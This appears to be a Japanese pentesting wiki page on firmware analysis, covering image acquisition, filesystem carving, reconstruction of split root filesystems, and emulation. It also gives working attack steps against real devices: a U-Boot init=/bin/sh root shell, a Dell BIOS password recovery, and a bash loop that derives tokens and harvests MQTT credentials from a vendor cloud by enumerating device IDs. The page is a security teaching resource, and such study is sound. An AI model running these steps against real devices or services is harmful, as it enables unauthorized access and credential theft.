# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

公開されているハードウェアインターフェースから取得する方法については、[UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) と [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) を参照してください。コンソールにアクセスする前に、起動時のUART出力を再現可能な方法でキャプチャするには、[SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) を参照してください。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・促進し、デバイスを正常に動作させるために不可欠なソフトウェアです。不揮発性メモリに保存されているため、電源を入れた瞬間からデバイスが重要な命令にアクセスでき、オペレーティングシステムの起動につながります。Firmwareを調査し、必要に応じて変更することは、セキュリティ上の脆弱性を特定する重要なステップです。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を理解するための重要な初期ステップです。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行しているオペレーティングシステム
- Bootloaderの詳細
- ハードウェア構成とデータシート
- コードベースのメトリクスとソースの場所
- 外部ライブラリとライセンスの種類
- 更新履歴と規制認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定された脆弱性

この目的には、**open-source intelligence (OSINT)** ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動のレビュープロセスで分析することも有効です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などのツールは、潜在的な問題を見つけるために活用できる、無料の静的解析を提供しています。

## **Firmwareの取得**

Firmwareはさまざまな方法で取得できます。それぞれ難易度は異なります。

- 開発者やメーカーなどの提供元から**直接取得**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているFirmwareファイルを見つけるために **Google dork** クエリを利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) などのツールを使い、**cloud storage** に直接アクセスする
- man-in-the-middle techniquesを使って**更新を傍受**する
- **UART**、[**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash)、**PICit** などの接続を介してデバイスから**抽出**する
- デバイス通信内の更新リクエストを**スニッフィング**する
- **ハードコードされた更新エンドポイント**を特定して利用する
- bootloaderまたはネットワークから**ダンプ**する
- 他の方法がすべて失敗した場合は、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTのみのログ：フラッシュ内のU-Boot envを介してroot shellを強制する

UART RXが無視され、ログしか取得できない場合でも、オフラインで**U-Boot環境blobを編集**すれば、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8 clipとprogrammerを使ってSPI flashをダンプします（3.3V）。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env パーティションを特定し、`bootargs` に `init=/bin/sh` を追加して、blob の **U-Boot env CRC32 を再計算**します。
3. env パーティションだけを書き戻して再起動すると、UART に shell が表示されます。

これは、bootloader shell が無効化されていても、外部 flash アクセス経由で env パーティションを書き換えられる組み込みデバイスで有効です。

### Firewall のコピータスクによる保護コードの漏えい

一部の MCU では、保護されていないアプリケーションコードから、保護された Flash を直接読み取る代わりに、保護領域への gateway を呼び出せます。アプリケーションコードの実行権を得た後は、各 gateway task を個別のメモリ転送プリミティブとして調べてください。Cypherock X1 のケースでは、STM32L4 Firewall の call gate は、task、外部の `data` ポインター、長さ、保護された `address` を受け取りました。write task は、Firewall Code 内を指す `data` ソースポインターを拒否できませんでした。呼び出し元はそのコードを直接読み取れませんでしたが、gateway 自体が保護された不揮発性ストレージにコピーでき、許可された read task を通じてその内容を取得できました。<sup>[[15]](#references)</sup>

この種の漏えいを再現するには、対応する read task がある書き込み可能な保護ストレージページを特定し、write のソースを保護コード内の連続したアドレスに設定して、ステージングしたバイト列を読み戻します。書き込みを繰り返す前に、ストレージ媒体を確認してください。このケースでは Flash だったため、ページを再利用するには消去が必要でした。研究者は、有効な Secure Data Storage の内容を消去して復元するルーチンを使用し、wallet データを上書きするのではなく、残りの空き領域にコードをステージングしました。これには MCU 上でのコード実行と、到達可能な call gate が必要です。認証されていないホストから直接読み取りを回避する手法ではありません。<sup>[[15]](#references)</sup>

復元したコードから、[firmware-update と boot-integrity における信頼上の不備](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata)が明らかになる可能性があります。<sup>[[15]](#references)</sup>

## firmware の解析

これで **firmware を入手できた**ので、どのように扱うべきかを判断するために、その情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

これらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いです。高ければ、暗号化されている可能性が高いです（何らかの方法で圧縮されている場合もあります）。

さらに、以下のツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使ってファイルを調べることもできます。

### 外部フラッシュ内の生のディスプレイアセット

外部SPIダンプが、必ずしもMCUの実行可能なファームウェアであるとは限りません。Cortex-Mを対象とする場合、候補となる各コード領域の先頭をデバイスのメモリマップと照合してください。通常のベクタテーブルでは、妥当なSRAMスタックポインタと、実行可能メモリ内のリセットハンドラアドレスから始まります。オフセット0にベクタテーブルがないからといって、チップ全体にコードがないとは限りません。他のオフセットやブート構成も調べてください。`binwalk` でコンテナが見つからない場合は、生のバイト列を調べ、[デコードしたSPIキャプチャ](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer)から得たフラッシュ読み取りアドレスと、新しい画面を読み込む操作を照合してください。<sup>[[14]](#references)</sup>

ディスプレイアセットの領域では、PNG/JPEGと決めつけず、候補となるピクセル形式と寸法を試してください。引用元のデバイスでは、**80×160 RGB565リトルエンディアン**のフレームが使われていました。1ピクセルあたり2バイトなので、1フレームは**25,600バイト**（25 KiB）であり、24キロビットではありません。デコードしたフラッシュ読み取りアドレスから画面アセットのオフセットを特定し、研究者は用意した画像を `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` で変換し、元のダンプ内にある同じサイズのアセットと置き換え、`flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` で書き込み、ディスプレイに新しい画像が表示されることを確認しました。これは書き換え可能な*外部ディスプレイアセット*を示すものであり、MCU内部ファームウェアの抽出や再書き込みを示すものではありません。書き込みを行う前に、元のダンプを保管し、寸法、バイト順、オフセット、置き換えるデータの長さを確認してください。<sup>[[14]](#references)</sup>

### 差分フラッシュ解析と復元可能なXORシークレットストア

ファームウェア設定の保存形式が文書化されていない場合は、まず条件を揃えてフラッシュを複数回読み取り、設定を**1つだけ**変更してから、チップ全体を再度ダンプし、オフセットを比較してください。値を管理して実験を繰り返すと、設定の変更とカウンタや書き込みメタデータの変更を区別できます。データが同じ場所ではなく新しいオフセットに現れる場合、追記型またはログ構造のストアであることを示しています。削除済みまたは tombstone 化されたエントリも残してください。ペイロードのバイト列を復元できる可能性があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk` などのツールでファームウェアモジュールを抽出し、Ghidraでwriter/validatorをリバースエンジニアリングします。暗号文のパターンだけから方式を推測するのではなく、コードでフィールド境界、パディング、鍵のインデックス付け、鍵導出を確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロパディングから鍵を復元する

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)で説明したように、既知平文があれば、同じオフセットのキーストリームバイトが判明します。固定長フィールドは、ゼロパディングが繰り返しXOR鍵のすべてのインデックスに及ぶ場合、特に露出しやすくなります。`0x00 XOR key_byte = key_byte`なので、暗号化されたパディングから鍵のバイトが直接分かります。すべての鍵インデックスが網羅されていれば、暗号文の末尾から鍵を復元し、データが格納された部分を復号できます。<sup>[[12]](#references)</sup>

Dellの脆弱なDVAR BIOSパスワード形式は、その具体例です。32バイトのフィールドのバイト`0`は平文で、バイト`1..31`には20バイトの繰り返し鍵が使われます。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワードの長さを `L` とすると、XOR の前は位置 `L..31` がゼロでした。`L <= 12` の場合、これらの位置がすべてのキーインデックスをカバーするため、完全なキーとパスワードを brute force なしで復元できます:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 過去のレコードから鍵を抽出する

各レコードを個別に解析してはいけません。DVAR鍵は、おおよそ`modified_md5(device_seed || variable_GUID || password[0])`から導出されます。device seedとGUIDは固定されており、パスワードに依存する入力は平文の先頭1バイトだけです。したがって、デバイスごとの鍵は最大256個で、同じバイトで始まるレコードは同じ鍵を共有します。アクティブなレコードと削除済みのレコードを、そのバイトごとにグループ化してください。短い過去のレコードからパディング経由で完全な鍵が漏れ、その鍵で、パディングだけでは鍵を特定できない現在の長いレコードを復号できる場合があります。そのため、古い暗号文を消去せず tombstone 化すると、パスワードのローテーションによってかえって露出が増える可能性があります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn)ツールは、DVARを検出し、候補レコードを検証してパスワードを復元し、保存されたデータや鍵のバイト列を生データとして表示できます。checkoutからビルドし、検証済みのフラッシュイメージを次のようにスキャンします。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングのチェック、鍵のエントロピー、鍵が折り返す箇所の一貫性を使って誤検出を排除します。複数のdumpで書き込みごとのビット反転がまばらに見られる場合は、観測されたマスクを列挙し、これらの制約を使って修正候補を順位付けします。ただし、曖昧な文字がある場合は、ヒューリスティックによる出力を正確な復元結果として提示せず、その曖昧さを報告してください。<sup>[[12]](#references)</sup>

Password verifierには、可逆な暗号文ではなく、salt付きの反復型一方向ハッシュを保存してください。また、log-structured storeでは、置き換えられた古い秘密情報を安全に削除してください。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

先ほど紹介したコメント付きのツール（`binwalk -ev <bin>` など）を使えば、**ファイルシステムを抽出**できているはずです。\
Binwalkは通常、ファイルシステムの種類を名前にした**フォルダー**内に抽出します。一般的な種類は次のとおりです。squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### ファイルシステムの手動抽出

Binwalkのシグネチャに**ファイルシステムのマジックバイトが含まれていない**ことがあります。その場合は、binwalkで**ファイルシステムのオフセットを特定し、圧縮されたファイルシステムをバイナリからcarveして**、以下の手順に従い、種類に応じて**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

次の **dd command** を実行して、Squashfs ファイルシステムを抽出します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドを実行する方法もあります。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs の場合（上記の例で使用）

`$ unsquashfs dir.squashfs`

実行後、ファイルは "`squashfs-root`" ディレクトリに格納されます。

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND フラッシュを使った ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込みルートファイルシステムの再構築

raw eMMC/SSD ダンプに有効なファイルシステムヘッダーが含まれているものの、メタデータのオフセットが公称パーティションの範囲を超えている場合、すぐに破損と判断しないでください。組み込みのブートコードは、Device Mapper を使って複数の物理範囲から実際のルートデバイスを構成することがあるため、GPT パーティションを1つだけ carving すると、最初のセグメントしか取得できません。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得処理が完了していること、サイズが安定していること、イメージを保持している書き込みプロセスがないことを確認します。ファイル名に開始アドレスと終了アドレスが含まれている場合は、その範囲を実際のバイト数と比較してください。GPT を読み取り専用モードで復元し、必要な範囲だけをアタッチします。ボリュームグループの衝突や意図しない書き込みが発生する可能性があるため、ワークステーション上で信頼できない物理ボリュームに対して `vgchange -ay` を実行しないでください。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init ロジックまたは LVM stack がイメージ全体を参照する必要がある場合は、使い捨ての VM を使用してください。標準の boot partition に残された過去の boot log は特に有用です。bootloader が proprietary container のオフセット、コンポーネントの長さ、slot の選択、アライメント規則、署名検証を記録している場合があります。これらの値を使って、埋め込まれたコマンドライン/kernel/initramfs を切り出し、各出力を `file`、magic bytes、`binwalk` で個別に検証してください。container の末尾まで読み込むと、initrd、ACPI object、または署名が誤って kernel に追加されることがあります。<sup>[[9]](#references)</sup>

#### boot-time block map の復元

kernel の initramfs を抽出し、その `/init` とストレージライブラリをリバースしてください。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、パーティションパスへの文字列参照をたどり、アクティブな A/B slot を選択して table を構築するコードを追跡してください。radare2 の開始点として、`r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` が役立ちます。<sup>[[9]](#references)</sup>

linear target は、仮想デバイスの連続した範囲を、1 つ以上の backing device の範囲にマッピングします。復元された 2 セグメントの table は、一般に次の形式になります（すべての位置と長さは 512-byte sector 単位です）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

マシンコードの算術演算を、整数幅、シフト、単位変換を含めて正確に再現してください。たとえば、次の式はバイトサイズをまず4-KiB境界に切り下げてから、512バイト単位のセクターに変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

テーブルの順序に従って範囲を有界サイズのチャンクでコピーし、メディアダンプ全体をメモリに読み込まずにフラットな解析イメージを再構築します。これにより、ホスト側の mapper デバイスの作成も回避できます。GPT から導出したオフセット、反転したセクター数、最終的な出力長は、それぞれ別個のアサーションとして保持してください。<sup>[[9]](#references)</sup>

#### 破損と一定の再構築エラーを区別する

SquashFS では、`unsquashfs` を実行する前に、`hsqs` マジックを確認し、スーパーブロックのオフセット 40 にあるリトルエンディアンの 64 ビット `bytes_used` フィールドをデコードしてください。無関係な複数の構造で抽出に失敗する場合は、予想位置の前後の広い範囲を検索し、構造上の候補として強い根拠を求めます。たとえば、展開可能なメタデータブロック、連続する複数の有効なディレクトリエントリ、妥当な inode フィールド、inode 数と整合するルート inode、有効な整合性メタデータ構造などです。マジックが 1 つ見つかっただけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ符号付きデルタによって、ディレクトリメタデータとverityレコードなど、独立した構造が有効になる場合、バイト欠落ではなく、セグメント開始位置の系統的な誤りが原因である可能性が高いです。孤立データの復旧やファイルシステムメタデータのパッチ適用を試みる前に、逆算に戻り、切り捨てられた余り、符号の扱い、オーバーフロー、セクターやページの丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護境界は分けて考えてください。TPMで封印されたLUKSボリュームはデータの機密性を保護する一方、署名付きdm-verityマッピングはルートファイルシステムの整合性を保護します。ソフトウェアTPMでは、元の物理TPMに封印された鍵を復元できません。また、verity検証を省略する調査専用initを使って改変されたSquashFSを起動しても、その署名を偽造したことにも、dm-verityを破ったことにもなりません。<sup>[[9]](#references)</sup>

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために解析することが重要です。このプロセスでは、さまざまなツールを使ってファームウェアイメージを分析し、有用なデータを抽出します。

### 初期分析ツール

ファームウェア分析用のツールや参考資料については、[Third-Party Tools and Resourcesのファームウェアのセクション](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware)を参照してください。

バイナリファイル（`<bin>`と表記）の初期調査には、一連のコマンドを使用します。これらのコマンドは、ファイル形式の特定、文字列の抽出、バイナリデータの分析、パーティションとファイルシステムの詳細の把握に役立ちます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>` で**エントロピー**を確認します。エントロピーが低い場合は暗号化されていない可能性が高く、エントロピーが高い場合は暗号化または圧縮されている可能性があります。

**埋め込まれたファイル**を抽出するには、**file-data-carving-recovery-tools**のドキュメントや、ファイル検査用の**binvis.io**などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使うと、通常はファイルシステムを抽出でき、ファイルシステムの種類（例: squashfs、ubifs）にちなんだ名前のディレクトリに展開されます。ただし、magic bytes が不足していて **binwalk** がファイルシステムの種類を認識できない場合は、手動での抽出が必要です。その場合は、まず `binwalk` でファイルシステムのオフセットを特定し、次に `dd` コマンドでファイルシステムを切り出します:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### ファイルシステムの分析

ファイルシステムを抽出したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、アップデートサーバーの機能、未コンパイルのコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注目します。

確認すべき**主要な場所**と**項目**は次のとおりです。

- ユーザー認証情報を含む **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL 証明書とキー
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析の対象となる組み込みバイナリ
- 一般的な IoT デバイスの Web サーバーとバイナリ

ファイルシステム内の機密情報や脆弱性の発見に役立つツールはいくつかあります。

- 機密情報の検索には [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア分析には [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的・動的分析には [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、および [**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unix バイナリ向けの **checksec.sh** や Windows バイナリ向けの **PESecurity** などのツールは、悪用される可能性のある保護されていないバイナリの特定に役立ちます。

## URLトークンからクラウド設定と MQTT 認証情報を取得する

多くの IoT ハブは、次のようなクラウドエンドポイントからデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析中に、たとえば次のように、`<token>` がハードコードされた秘密鍵を使ってデバイス ID からローカルで導出されることがわかる場合があります。

- token = MD5( deviceId || STATIC_KEY )。大文字の 16 進数で表される

この設計では、deviceId と STATIC_KEY を知っている人なら誰でも URL を再構築してクラウド設定を取得でき、その結果、平文の MQTT 認証情報やトピックのプレフィックスが漏えいすることがよくあります。

実践的な手順:

1) UART の起動ログから deviceId を抽出する

- 3.3V UART アダプター（TX/RX/GND）を接続してログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URLのパターンとbrokerアドレスを出力する行を探します。例:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware から STATIC_KEY と token アルゴリズムを復元する

- バイナリを Ghidra/radare2 に読み込み、設定パス（"/pf/"）または MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash で token を導出し、digest を大文字にする:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) クラウド設定と MQTT 認証情報を収集する

- URL を組み立て、curl で JSON を取得する。jq で解析して secrets を抽出する:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と脆弱な topic ACL（存在する場合）を悪用する

- 回収した認証情報を使ってメンテナンストピックを subscribe し、機密性の高いイベントを探す:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能なデバイス ID を列挙する（許可を得たうえで大規模に）

- 多くのエコシステムでは、ベンダー OUI／製品／タイプのバイト列の後に、連番のサフィックスが埋め込まれています。
- 候補となる ID を順に試し、トークンを導出して、プログラムで設定を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大量の列挙を試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、対象ハードウェアを変更せずに秘密情報を復元できるよう、エミュレーションまたは静的解析を優先してください。


ファームウェアをエミュレートすることで、デバイスの動作や個々のプログラムの **dynamic analysis** が可能になります。この方法では、ハードウェアやアーキテクチャへの依存による問題が発生することがありますが、root filesystem や特定のバイナリを、Raspberry Pi などのアーキテクチャとエンディアンが一致するデバイス、または事前構築済みの仮想マシンに移すことで、さらなるテストが可能になります。

### 個々のバイナリのエミュレーション

単一のプログラムを調べる場合は、そのプログラムのエンディアンと CPU アーキテクチャを特定することが重要です。

#### MIPS アーキテクチャの例

MIPS アーキテクチャのバイナリをエミュレートするには、次のコマンドを使用できます。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARM バイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレーターを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールを使うと、ファームウェア全体のエミュレーションを実行できます。処理が自動化され、動的解析にも役立ちます。

### エミュレーション用に分割・検証済みルートファイルシステムを再構築する

SquashFS のスーパーブロックは読み取れるものの、inode、ディレクトリ、フラグメントテーブルのオフセットが不自然な場合でも、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、そこに構築されるブロックデバイスのグラフを再現してください。組み込みシステムでは、名目上のルートパーティションが公開されていても、別のパーティションから借りたセクターを追加する `dm-linear` マッピングによって、実際のファイルシステムが構築されることがあります。スーパーブロックだけの検査は成功しても、それ以降のすべてのメタデータブロックがずれている可能性があります。<sup>[[11]](#references)</sup>

ファームウェアの演算を正確に再現してください。特に、長さの単位がバイト、512 バイトセクター、4 KiB ページのどれなのかを特定し、シフトと切り捨てを元の順序どおりに再現し、A/B レイアウトにおけるバンク依存の末尾領域も考慮してください。たとえば `(partition_bytes >> 12) << 3` は、まず 4 KiB 境界に切り捨ててから、結果を 512 バイトセクター単位で表します。これを `partition_bytes // 512` に置き換えると、追加される領域が数 KiB ずれて、その後の SquashFS テーブルがすべて破損する可能性があります。<sup>[[11]](#references)</sup>

有用な検証手順は次のとおりです。<sup>[[11]](#references)</sup>

1. 検証/init バイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクター、長さを特定する。
2. アラインメントの意味を変えずに、各領域を連結またはマッピングする。
3. それでも展開に失敗する場合は、予測される境界の周辺だけを狭い範囲で検索し、もっともらしいスーパーブロックだけで判断せず、連続する複数の有効なメタデータ構造を確認する。
4. 再構築したイメージに未変更の `unsquashfs` を実行する。すべてのディレクトリとフラグメントを正常にたどれることは、`unsquashfs -stat` の結果より確かな証拠となる。

#### Analyst-controlled dm-verity replacement

アナリストが QEMU カーネル、initramfs、仮想ディスクを制御できる場合、ベンダーの検証用 PID 1 を小型の静的リンク済み init に置き換えることで、変更したルートを起動できます。これは**ラボでのブートチェーン置換**であり、dm-verity、その RSA 署名、Secure Boot、TPM に封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換える init は、元のブートパスの実運用部分を模倣する必要があります。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプター 0–2 に接続し、`/proc` と `/sys` をマウントし、指定されたブロックデバイスを待ち、編集済みのルートを読み取り専用でマウントし、旧ルートの擬似ファイルシステムを切り離し、新しいマウントを `/` に移動してから `chroot` し、ファームウェア本来の `/sbin/init` を `execve()` します。`MS_MOVE` の**前に**`/dev`、`/proc`、`/sys` を切り離すことで、新しいルートに属するマウントポイントを誤って切り離すのを防げます。<sup>[[11]](#references)</sup>

変更した不変ルートとは別に、変更可能なデバイス状態を保持してください。qcow2 オーバーレイを使えば元のディスクの LVM 状態を維持しつつ、2 つ目の読み取り専用 virtio ディスクから編集済みの SquashFS を提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインでのイメージ状態のデバッグ

起動が遅い、破壊的な起動スクリプトがある、またはコンソールログが不安定で障害の原因が分かりにくい場合は、guestの外部から永続状態を調査します。実行中のVMが使用しているoverlayは決して接続しないでください。`qemu-nbd`で公開し、LVMの検出対象を意図したNBDパーティションに限定してから、切断前にボリュームグループを非アクティブ化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

